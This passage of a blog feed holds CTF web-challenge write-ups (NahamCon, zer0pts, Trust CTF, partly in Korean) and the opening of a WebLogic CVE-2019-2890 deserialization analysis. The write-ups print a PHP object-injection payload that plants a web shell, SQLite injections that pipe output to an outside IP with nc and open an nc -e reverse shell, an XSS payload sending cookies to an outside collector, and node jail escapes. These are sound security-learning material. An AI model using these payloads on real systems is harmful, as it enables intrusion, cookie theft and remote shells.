class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$request_log</span> = fopen(<span class="keyword">$this</span>-&gt;logs , <span class="string">&quot;a&quot;</span>);</span><br><span class="line">            fwrite(<span class="variable">$request_log</span>, <span class="keyword">$this</span>-&gt;request);</span><br><span class="line">            fwrite(<span class="variable">$request_log</span>, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            fclose(<span class="variable">$request_log</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>If you look at log.php, you can see that a file is created using the values of <code>logs</code> and <code>requests</code>. And since logs are the file name and request is the contents of the file, you just need to upload the web shell using php object injection :)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;log&quot;:3:&#123;s:4:&quot;logs&quot;;s:9:&quot;pocas.php&quot;;s:7:&quot;request&quot;;s:29:&quot;&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;&quot;;s:4:&quot;milk&quot;;s:5:&quot;pocas&quot;&#125;</span><br></pre></td></tr></table></figure><p>I wrote the payload as above.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge.nahamcon.com:32209&#x2F;pocas.php?cmd&#x3D;ls</span><br><span class="line"></span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x    1 apache   apache        4096 Mar 15 04:35 .</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Mar 12 00:42 ..</span><br><span class="line">-rw-r--r--    1 apache   apache          45 Dec  2 21:45 index.html</span><br><span class="line">-rw-r--r--    1 apache   apache        4577 Mar 12 00:41 index.php</span><br><span class="line">-rw-r--r--    1 apache   apache         257 Mar 12 00:41 log.php</span><br><span class="line">drwxr-xr-x    1 apache   apache        4096 Mar 12 00:42 ndwbr7pVKNCrhs-CerealnMilk</span><br><span class="line">-rw-r--r--    1 apache   apache          31 Mar 15 04:35 pocas.php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge.nahamcon.com:32209&#x2F;pocas.php?cmd&#x3D;ls%20ndwbr7pVKNCrhs-CerealnMilk</span><br><span class="line"></span><br><span class="line">flag.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challenge.nahamcon.com:32209&#x2F;pocas.php?cmd&#x3D;cat%20ndwbr7pVKNCrhs-CerealnMilk&#x2F;flag.txt</span><br><span class="line"></span><br><span class="line">flag&#123;70385676892a2a813a666961ddd6f899&#125;</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : flag{70385676892a2a813a666961ddd6f899}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> SQL Injection </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zer0pts CTF 2021 Write Up</title>
      <link href="2021/03/08/2021-03-08-zer0pts-CTF-2021/"/>
      <url>2021/03/08/2021-03-08-zer0pts-CTF-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-Baby-SQLi-170-pts"><a href="#Web-Baby-SQLi-170-pts" class="headerlink" title=" (Web) Baby SQLi [170 pts]"></a><span style="color:#21C587"></span> (Web) Baby SQLi [170 pts]</h2><blockquote><p>Baby SQLi challenge is bypass of waf and using shell command.</p></blockquote><p>First, You can using <code>.system/.shell/.sh</code> command and execute shell command in SQLite3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SQLite3 CLI</span><br><span class="line">sqlite&gt; .sh id|nc 141.164.52.207 2</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Terminal</span><br><span class="line">root@py:~# nc -lp 2</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><p>As above, you can see in sqlite3 executes a shell command using the <code>.sh</code> command.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqlite3_query</span>(<span class="params">sql</span>):</span></span><br><span class="line">    p = subprocess.Popen([<span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;database.db&#x27;</span>],</span><br><span class="line">                         stdin=subprocess.PIPE,</span><br><span class="line">                         stdout=subprocess.PIPE,</span><br><span class="line">                         stderr=subprocess.PIPE)</span><br><span class="line">    o, e = p.communicate(sql.encode())</span><br><span class="line">    <span class="keyword">if</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(e)</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> o.decode().split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> row == <span class="string">&#x27;&#x27;</span>: <span class="keyword">break</span></span><br><span class="line">        result.append(<span class="built_in">tuple</span>(row.split(<span class="string">&#x27;|&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>Looking at the source code, you can line jump using the <code>\n</code> character because using the <code>communicate()</code> in <code>subporcess.Popen()</code> in <code>sqlite3_query()</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;post&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span>():</span></span><br><span class="line">    username = flask.request.form.get(<span class="string">&#x27;username&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&#x27;password&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(username) &gt; <span class="number">32</span> <span class="keyword">or</span> <span class="built_in">len</span>(password) &gt; <span class="number">32</span>:</span><br><span class="line">        flask.session[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;Too long username or password&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> flask.redirect(flask.url_for(<span class="string">&#x27;home&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    password_hash = hashlib.sha256(password.encode()).hexdigest()</span><br><span class="line">    result = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = sqlite3_query(</span><br><span class="line">            <span class="string">&#x27;SELECT * FROM users WHERE username=&quot;&#123;&#125;&quot; AND password=&quot;&#123;&#125;&quot;;&#x27;</span></span><br><span class="line">            .<span class="built_in">format</span>(sqlite3_escape(username), password_hash)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        flask.session[<span class="string">&#x27;name&#x27;</span>] = username</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flask.session[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;Invalid Credential&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.url_for(<span class="string">&#x27;home&#x27;</span>))</span><br></pre></td></tr></table></figure><p>And looking at the source code in login logic, you can see that <code>username</code>/<code>password</code> value is input, the length is verified, and it is put in query statement and at this point, you can see that the <code>username</code> value is escaped. but, you don’t worry because treats escape characters as simple string is sqlite3.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username &#x3D; &quot;\&quot; or 1&#x3D;1 -- &quot; and password &#x3D; &quot;pocas&quot;;</span><br></pre></td></tr></table></figure><p>In other words, It doensn’t matter if it escaped as above.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username &#x3D; &quot;\&quot;;</span><br><span class="line">.sh id|nc 141.164.52.207 2;</span><br><span class="line">and password &#x3D; &quot;pocas&quot;;</span><br></pre></td></tr></table></figure><p>So, you can use shell command by doing line jumps as above and using the .sh command.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://web.ctf.zer0pts.com:8004&quot;</span></span><br><span class="line">username = <span class="string">&#x27;&quot;;\n.sh id|nc 2376348879 2\n&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pocas&quot;</span>&#125;</span><br><span class="line">requests.post(url+<span class="string">&quot;/login&quot;</span>, data)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# nc -lp 2</span><br><span class="line">uid&#x3D;1000(app) gid&#x3D;1000(app)</span><br><span class="line">root@py:~#</span><br></pre></td></tr></table></figure><p>If you write the exploit code as above, close <code>SELECT</code> statemnt and in the line immediately underneath execute <code>.sh</code> command.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://web.ctf.zer0pts.com:8004&quot;</span></span><br><span class="line">username = <span class="string">&#x27;&quot;;\n.sh nc 2376348879 2 -e sh\n&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pocas&quot;</span>&#125;</span><br><span class="line">requests.post(url+<span class="string">&quot;/login&quot;</span>, data)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# nc -lvnp 2</span><br><span class="line">Listening on 0.0.0.0 2</span><br><span class="line">Connection received on 165.227.180.221 38761</span><br><span class="line">id</span><br><span class="line">uid&#x3D;1000(app) gid&#x3D;1000(app)</span><br><span class="line">cat templates&#x2F;index.html</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;Welcome&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Welcome, &#123;&#123;name&#125;&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">        &#123;% if name &#x3D;&#x3D; &#39;admin&#39; %&#125;</span><br><span class="line">        &lt;p&gt;zer0pts&#123;w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?&#125;&lt;&#x2F;p&gt;</span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">        &lt;p&gt;No flag for you :(&lt;&#x2F;p&gt;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>Final, I pass the shell using <code>e</code> option about <code>nc</code> and read <code>index.html</code> and saw the flag.</p><blockquote><p>FLAG : zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Trust CTF 2021 Write Up</title>
      <link href="2021/02/28/2021-02-27-Trust-CTF-2021/"/>
      <url>2021/02/28/2021-02-27-Trust-CTF-2021/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image/blob/main/TrustCTF/home.png?raw=true"></p><p>오늘은 디미고의 Trust라는 팀에서 CTF를 주최해서 참여를 했었습니다. 개인적인 일도 있고 해서 아침부터 참여하지 못 하고, 오후에 조금 참여를 했습니다.</p><hr><h2 id="Web-babyxss-270-pts"><a href="#Web-babyxss-270-pts" class="headerlink" title=" (Web) babyxss [270 pts]"></a><span style="color:#21C587"></span> (Web) babyxss [270 pts]</h2><blockquote><p>babyxss 문제는 DOMPurify Bypass로 위장한 간단한 XSS 문제입니다.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;secrets.php&quot;</span>);</span><br><span class="line"><span class="comment"># This Challenge using newest version DomPurify..! Maybe unexploitable!!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;content-security-policy: base-uri &#x27;self&#x27;; block-all-mixed-content; connect-src &#x27;self&#x27;;&quot;</span>);</span><br><span class="line">    header(<span class="string">&#x27;X-Frame-Options: DENY&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1 id=&#x27;name&#x27;&gt;Hello &lt;/h1&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script src=&quot;https://code.jquery.com/jquery-3.5.1.min.js&quot;integrity=&quot;sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script type=&#x27;text/javascript&#x27; src=&#x27;https://cure53.de/purify.js&#x27;&gt;&lt;/script&gt;&lt;script&gt;var name=&#x27;&quot;</span>. base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) .<span class="string">&quot;&#x27;;document.getElementById(&#x27;name&#x27;).innerHTML += DOMPurify.sanitize($(&#x27;&lt;p&gt;&#x27;).html(atob(name)).text())&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>문제로 들어오면 위와 같은 코드가 나오는데 보면 CSP도 걸려 있고, 밑에는 DOMPurify를 이용해서 XSS를 대응하고 있는 것을 볼 수 있습니다. 그래서 그냥 DOMPurify Bypass Payload를 아무 거나 삽입해서 트리거가 되길래 쿠키를 탈취해서 플래그를 얻었습니다.<br></p><p>하지만 트리거가 된 이유는 DOMPurify를 우회해서가 아닙니다. DOMPurify는 최신 버전을 사용하고 있기 때문에 우회하는 건 불가능했습니다. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;&lt;p&gt;&#x27;</span>).html(atob(name)).text()</span><br></pre></td></tr></table></figure><p>하지만 위 코드를 <code>sanitize()</code> 메서드의 인자로 넘겨주고 있는 것을 볼 수 있습니다. 바로 저기서 DOM 내부에 잠시 들어가게 되는데 저때 XSS가 트리거가 되는 것 입니다. 그래서 일반적인 페이로드를 이용해서도 XSS트리거를 할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss.trustctf.xyz&#x2F;?name&#x3D;%3Csvg%3E%3C&#x2F;p%3E%3Cstyle%3E%3Ca%20id&#x3D;%22%3C&#x2F;style%3E%3Cimg%20src&#x3D;1%20onerror&#x3D;location.href&#x3D;%27https:&#x2F;&#x2F;79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&#x2F;?f&#x3D;%27.concat(document.cookie)%3E%22%3E</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : TRUST{cf909172b91c8bf3f70c0e71f2809f36}</p></blockquote><hr><h2 id="Web-FLAG-Checker-1000-pts"><a href="#Web-FLAG-Checker-1000-pts" class="headerlink" title=" (Web) FLAG Checker [1000 pts]"></a><span style="color:#21C587"></span> (Web) FLAG Checker [1000 pts]</h2><blockquote><p>FLAG Checker 문제는 간단한 ReDos 문제입니다. 이론만 저번에 공부하고 처음 해보는데 그냥 신기한 기법인 거 같습니다. </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Wrong.... <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;./secret.php&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = preg_match(<span class="string">&quot;/<span class="subst">&#123;$_GET[&#x27;flag&#x27;]&#125;</span>/&quot;</span>, <span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$flag</span> === <span class="variable">$_GET</span>[<span class="string">&#x27;answer&#x27;</span>] &amp;&amp; <span class="variable">$result</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Wrong....&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>문제로 들어오면 위와 같이 나오는데 얼마전에 이런 문제를 본적이 있어서 바로 ReDos가 생각이 났고, 해당 기법으로 슥삭 해주니 플래그가 나왔습니다. 해당 문제와 비슷한 문제가 나중에 webhacking.kr에도 올라온다고 해서 따로 익스 코드는 올리지 않겠습니다.</p><blockquote><p>FLAG : TRUST{2ef0c0b759425eed6d3932c109e0fe74}</p></blockquote><hr><h2 id="Web-nodejail-Not-Solve-400-pts"><a href="#Web-nodejail-Not-Solve-400-pts" class="headerlink" title=" (Web) nodejail (Not Solve) [400 pts]"></a><span style="color:#21C587"></span> (Web) nodejail (Not Solve) [400 pts]</h2><blockquote><p>nodejail 문제는 간단한 제일문제 입니다.</p></blockquote><p><img src="https://github.com/wjddnjs33/image/blob/main/TrustCTF/jail.png?raw=true"></p><p>문제로 들어오면 그냥 입력창 하나가 보입니다. Javasript 코드를 입력해주면 여러가지 문자가 필터링 걸린 것을 확인할 수 있습니다.<br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`c?t<span class="subst">$&#123;IFS&#125;</span>~~`</span>).toString()</span><br></pre></td></tr></table></figure><p>대회 당시에는 위와 같이 ${IFS}를 이용해서 공백을 우회하는 방식을 이용해서 진행하고 있었습니다. 하지만 위와 같이 아무리 해봐도 <code>err</code>만 반환할 분 아무 일도 일어나지 않아 그냥 포기 했었습니다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`fs`</span>).readdirSync(<span class="string">`./`</span>)</span><br></pre></td></tr></table></figure><p>대회가 끝나고 승주님에게 물어보니 <code>fs</code> 모듈을 이용해서 디텍터리 탐색을 하는 코드를 받을 수 있었다. 위 코드를 보고 한 참 어이가 없었다. <code>fs</code>를 모듈을 이용해서 파일을 읽고, 쓰고만 되는 줄 알았는데 알고 보니 디렉터리를 탐색할 수 있다는 것을 처음 알았기 때문이다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`\x63at\x20T\x2a`</span>).toString()</span><br></pre></td></tr></table></figure><p>그리고 두 번째는 경준님은 어케 풀었나 궁금해서 물어보니 위와 같이 위와 같이 16진수를 이용해서 공백을 우회한 것을 보고, 또 어이가 없었다..</p><blockquote><p>TRUST{th1s_1s_3xtrem3_n0d3_j41l}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> ReDos </tag>
            
            <tag> Javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-2890 Unserialize RCE in Oracle WebLogic</title>
      <link href="2021/02/10/2021-02-10-CVE-2019-2890/"/>
      <url>2021/02/10/2021-02-10-CVE-2019-2890/</url>
      
        <content type="html"><![CDATA[<p>예전부터 분석을 하고, 글을 작성하려 했지만 게으름 탓인 지 2020년에 할려 했던 걸 지금 하고 있습니다. 이번 취약점은 오라클에서 제공하는 Oracle Fusion Middleware의 웹 로직 서버에서 발견 된 역직렬화 RCE 취약점입니다. 해당 웹 로직 서버에서는 데이터를 T3 프로토콜을 이용해서 전달하는데, 안전하게 전달하기 위해서 <code>Serialize</code> -&gt; <code>encryption</code> -&gt; <code>Decryption</code> -&gt; <code>Unserialize</code>와 같은 과정을 거쳐 전달한다고 합니다. 하지만 데이터에 대한 검증 절차가 존재하지 않아 데이터를 역직렬화 할 때 RCE 취약점이 터지게 됩니다.<br></p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2019-2890</td><td>WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0</td><td>7.2</td></tr></tbody></table><p><br>VE-2019-2890는 WebLogic Server <code>10.3.6.0.0</code>, <code>12.1.3.0.0</code>, <code>12.2.1.3.0</code>에서 모두 발생했고, 2019년 10월 16일에 POC가 공개됐고, 10월에 바로 긴급패치를 발표했다고 합니다.<br></p><hr><h2 id="CVE-2019-2890"><a href="#CVE-2019-2890" class="headerlink" title=" CVE-2019-2890"></a><span style="color:#21C587"></span> CVE-2019-2890</h2><p>취약점은 <code>PersistentContext</code> 클래스에서 발생합니다.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSubject</span><span class="params">(ObjectOutputStream var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ByteArrayOutPutStream var2 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream var3 = <span class="keyword">new</span> ObjectOutputStream(var2);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (SubjectManager.getSubjectManager().isKernelIdentity(<span class="keyword">this</span>._subject)) &#123;</span><br><span class="line">        AuthenticatedSubject var4 = (AuthenticateSubject)SubjectManager.</span><br><span class="line">        getSubjectManager().getAnonymousSubject();</span><br><span class="line">        var3.writeObject(var4);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        var3.writeObject(<span class="keyword">this</span>._subject);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    var3.flush();</span><br><span class="line">    <span class="keyword">byte</span>[] var5 = var2.toByteArray();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (KernelStatus.isServer()) &#123;</span><br><span class="line">        var5 = EncryptionUtil.encrypt(var5);</span><br><span class="line">    &#125;</span><br><span class="line">    var5 = EncryptionUtil.encrypt(var5);</span><br><span class="line">    </span><br><span class="line">    var1.writeInt(var5.length);</span><br><span class="line">    var1.write(var5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>writeSubject</code> 메서드는 데이터를 직렬화 하고, 암호화하는 메서드입니다. <code>Line 5 ~ 11</code>에서 데이터를 직렬화하고, <code>Line 16 ~ 20</code>까지가 암호화하는 부분입니다. 여기서 직렬화할 때 데이터의 대한 검증 로직만 있었으면 해당 취약점은 터지지 않았을 건데, 검증 로직이 없어 취약점까지 연계가 되었습니다. 이렇게 writeSubject 메소드에서 만들어진 직렬화 데이터는 아까 말한 T3 프로토콜을 이용해서 웹 로직 서버로 전송을 하게 됩니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundExeception </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.initTransients();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>._lock.writeLock().lock();</span><br><span class="line">        <span class="keyword">this</span>._propertyMap = (Map)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._propBagClassNames = (Set)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._contextPropertyMap = (Map)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._invocationPropertyMap = (Map)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._state = (PersistentContext.State)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>.readsubject(var1);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>._lock.writeLock().unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>직렬화 데이터를 T3 프로토콜로 전송하면 <code>readObject</code> 메서드를 이용해서 받아 <code>readSubject</code> 메서드로 넘겨주는 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td 